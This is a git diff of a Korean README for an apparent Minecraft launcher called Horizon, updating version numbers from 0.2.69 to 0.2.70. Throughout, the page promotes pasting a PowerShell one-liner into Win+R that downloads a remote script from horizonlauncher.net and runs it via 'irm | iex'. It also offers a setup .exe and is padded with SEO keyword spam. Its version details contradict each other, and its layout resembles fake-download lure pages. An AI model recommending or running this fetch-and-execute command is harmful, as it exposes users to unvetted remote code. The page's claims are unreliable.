@@ -23,7 +23,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 
 <p align="center">
   <strong>최신 업데이트:</strong>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69">0.2.69</a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70">0.2.70</a>
   · <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases">모든 업데이트와 패치</a>
 </p>
 
@@ -64,12 +64,12 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
   <img alt="windows" src="https://img.shields.io/badge/OS-Windows_10%2F11-0078d4">
   <img alt="fps" src="https://img.shields.io/badge/FPS-Rust_client-orange">
   <img alt="free" src="https://img.shields.io/badge/가격-무료-success">
-  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.69-lightgrey">
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.69-informational"></a>
-  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.69-blue"></a>
+  <img alt="version" src="https://img.shields.io/badge/Launcher-0.2.70-lightgrey">
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70"><img alt="changelog" src="https://img.shields.io/badge/Changelog-0.2.70-informational"></a>
+  <a href="https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases"><img alt="releases" src="https://img.shields.io/badge/Releases-0.2.0_to_0.2.70-blue"></a>
 </p>
 
-<p align="center"><em>업데이트 2026-11-16: 런처 <strong>0.2.69</strong>, LGPL, Win+R, UAC. <a href="https://horizonlauncher.net/ko/">horizonlauncher.net</a>.</em></p>
+<p align="center"><em>업데이트 2026-11-17: 런처 <strong>0.2.70</strong>, LGPL, Win+R, UAC. <a href="https://horizonlauncher.net/ko/">horizonlauncher.net</a>.</em></p>
 
 [![Horizon Minecraft Rust 에디션 다운로드](https://horizonlauncher.net/media/social-preview.jpg)](https://horizonlauncher.net/ko/)
 
@@ -145,10 +145,11 @@ Horizon은 Mojang / Microsoft 제품이 **아닙니다**. **horizonlauncher.net*
 
 Horizon은 계속 관리됩니다. 패치가 정기적으로 나옵니다. 버전마다 별도 릴리스와 changelog. 현재 설치 파일은 사이트, 패치 기록은 여기.
 
-**최신 업데이트:** [0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) · **[모든 업데이트와 패치](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 개 (0.2.0 → 0.2.69).
+**최신 업데이트:** [0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) · **[모든 업데이트와 패치](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)** — 27 개 (0.2.0 → 0.2.70).
 
 | 버전 | 날짜 | |
 |---|---|---|
+| **[0.2.70](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70)** | 2026-11-17 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.70) |
 | **[0.2.69](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69)** | 2026-11-16 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.69) |
 | **[0.2.68](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68)** | 2026-11-15 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.68) |
 | **[0.2.67](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67)** | 2026-11-15 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.67) |
@@ -164,10 +165,9 @@ Horizon은 계속 관리됩니다. 패치가 정기적으로 나옵니다. 버�
 | **[0.2.57](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57)** | 2026-11-09 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.57) |
 | **[0.2.56](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56)** | 2026-11-08 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.56) |
 | **[0.2.55](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55)** | 2026-11-08 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.55) |
-| **[0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54)** | 2026-11-08 | [노트](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) |
 
 
-이전 버전: [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44) · [0.2.43](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.43)
+이전 버전: [0.2.54](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.54) · [0.2.53](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.53) · [0.2.52](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.52) · [0.2.51](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.51) · [0.2.50](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.50) · [0.2.49](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.49) · [0.2.48](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.48) · [0.2.47](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.47) · [0.2.46](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.46) · [0.2.45](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.45) · [0.2.44](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases/tag/0.2.44)
 
 
 ## Horizon Minecraft이란
@@ -190,7 +190,7 @@ Horizon은 계속 관리됩니다. 패치가 정기적으로 나옵니다. 버�
 
 - Windows 10 / Windows 11 x64
 - `horizon-launcher-setup.exe`
-- Horizon **0.2.69**
+- Horizon **0.2.70**
 - 무료 · 사이트는 러시아어와 영어
 
 ## Horizon 설치 — 두 가지 방법
@@ -223,7 +223,7 @@ powershell -NoP -c "irm https://horizonlauncher.net/install.ps1 | iex"
 같은 Horizon 설치 파일 — 명령 없이 파일 다운로드. 현재 **0.2.54**, Windows x64, 약 60 MB.
 
 **[Horizon 다운로드 — Windows setup](https://horizonlauncher.net/horizon-launcher-setup.exe)**  
-`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.69
+`horizon-launcher-setup.exe` · Windows x64 · ~60 MB · v0.2.70
 
 1. [horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)를 받습니다.
 2. Windows 설치 프로그램을 실행합니다.
@@ -287,7 +287,7 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 
 ### 자주 찾는 검색
 
-`Horizon 다운로드` · `Horizon 런처 Windows` · `Horizon 0.2.69` · [릴리스](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
+`Horizon 다운로드` · `Horizon 런처 Windows` · `Horizon 0.2.70` · [릴리스](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases)
 
 ## FAQ
 
@@ -304,13 +304,13 @@ Win+R: `irm https://horizonlauncher.net/install.ps1 | iex` · **[horizon-launche
 Horizon Rust 클라이언트에는 필요 없습니다.
 
 **라이선스는?**  
-**0.2.69**부터 Horizon 업스트림 **LGPL-3.0-or-later**. [https://horizonlauncher.net/ko/legal/](https://horizonlauncher.net/ko/legal/)
+**0.2.70**부터 Horizon 업스트림 **LGPL-3.0-or-later**. [https://horizonlauncher.net/ko/legal/](https://horizonlauncher.net/ko/legal/)
 
 **Distant Horizons, Create, 셰이더?**  
 지원 — 네이티브 모드 (.hnmod). [https://horizonlauncher.net/ko/distant-horizons/](https://horizonlauncher.net/ko/distant-horizons/) · [Create](https://horizonlauncher.net/ko/create-mod/) · [셰이더](https://horizonlauncher.net/ko/shaders/)
 
-**변경 로그 0.2.65–0.2.69?**  
-[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · 런처 **0.2.69** [https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/)
+**변경 로그 0.2.65–0.2.70?**  
+[Releases](https://github.com/1TAKURA1/Horizon-Minecraft-Launcher/releases) · 런처 **0.2.70** [https://horizonlauncher.net/ko/](https://horizonlauncher.net/ko/)
 
 **Windows 7 / macOS / Linux?**  
 **Windows 10/11 x64** 만 지원. [https://horizonlauncher.net/ko/download-horizon/](https://horizonlauncher.net/ko/download-horizon/).
@@ -334,12 +334,12 @@ Horizon Rust 클라이언트에는 필요 없습니다.
 
 ## English — Horizon Minecraft 런처 다운로드
 
-**Horizon**은 무료 **Windows Minecraft 런처**와 **Rust Java 클라이언트**(Minecraft Rust Edition)입니다. 영문 공식 페이지: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.69**. Mojang/Microsoft 공식 아님.
+**Horizon**은 무료 **Windows Minecraft 런처**와 **Rust Java 클라이언트**(Minecraft Rust Edition)입니다. 영문 공식 페이지: [https://horizonlauncher.net/en/](https://horizonlauncher.net/en/) · [https://horizonlauncher.net/en/download-horizon/](https://horizonlauncher.net/en/download-horizon/) · **[https://horizonlauncher.net/horizon-launcher-setup.exe](https://horizonlauncher.net/horizon-launcher-setup.exe)** · **0.2.70**. Mojang/Microsoft 공식 아님.
 
 
 ## SEO 태그와 검색어
 
-`Horizon 다운로드` `Horizon 런처` `Rust 마인크래프트` `Horizon 0.2.69` `horizonlauncher.net`
+`Horizon 다운로드` `Horizon 런처` `Rust 마인크래프트` `Horizon 0.2.70` `horizonlauncher.net`
 
 `Horizon 다운로드` `Horizon 런처` `Rust 마인크래프트` `Minecraft Rust Edition` `마인크래프트 FPS` `horizonlauncher.net` `Win+R Horizon` `Horizon 빠른 설치` `Horizon 설치` `Horizon 다운로드` `Distant Horizons Horizon` `Create 모드`
 
